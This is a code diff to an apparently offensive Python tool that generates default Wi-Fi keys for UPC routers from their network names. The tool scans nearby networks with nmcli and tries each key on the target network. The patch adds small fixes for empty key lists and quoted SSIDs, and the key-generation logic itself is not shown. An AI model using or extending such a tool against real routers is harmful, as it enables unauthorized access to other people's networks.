@@ -70,7 +70,7 @@ Python by dsc <sander@cedsys.nl>\n"""
     def start_crack(self, ssid, ask=True):
         keys = self.gen_keys(ssid)
 
-        if ask:
+        if ask and keys:
            msg("AyE, g0t %d kEyZ, wAnnA try 'm?" % len(keys))
            self.yo_dawg()
 
@@ -91,6 +91,9 @@ Python by dsc <sander@cedsys.nl>\n"""
             sys.stdout.write('%s%s%s ' % (yellow, keys[i]['pass'], endc))
         sys.stdout.write('\n\n')
 
+        if not keys:
+            msg("CoUld n0t g3n3r4t3 k3yz f0R sSiD \'%s\', sSiD format not supported. Tw33t to @bl4sty aND 4sk f0r 5gHZ $uPPorT :-D" % ssid)
+
         return keys
 
     def nm_scan(self):
@@ -102,7 +105,10 @@ Python by dsc <sander@cedsys.nl>\n"""
         aps = []
 
         try:
-            aps = [z for z in os.popen("nmcli d wifi | awk \'{ print $1; }\' 2> /dev/null").read().split('\n') if z.startswith('UPC')]
+            aps = os.popen("nmcli d wifi | awk \'{ print $1; }\' 2> /dev/null").read().split('\n')
+            aps = [z.replace('\"', "").replace("\'", "").strip() for z in aps]
+            aps = [z for z in aps if z.startswith('UPC')]
+
             if not aps:
                 exit("CoulD not sCAn (got r00t?) or DiD not finD Any SSiD's sTArting w1th \'UPC\'.")
 
@@ -117,6 +123,9 @@ Python by dsc <sander@cedsys.nl>\n"""
         return aps
 
     def nm_hak(self, ssid, keys):
+        if not keys:
+            return
+
         for key in keys:
             print "\r%s[+]%s TrYiNG k3Y %s%s%s 0n $$ID %s%s%s ..." % (
                 green, endc, yellow, key['pass'], endc, blue, ssid, endc)
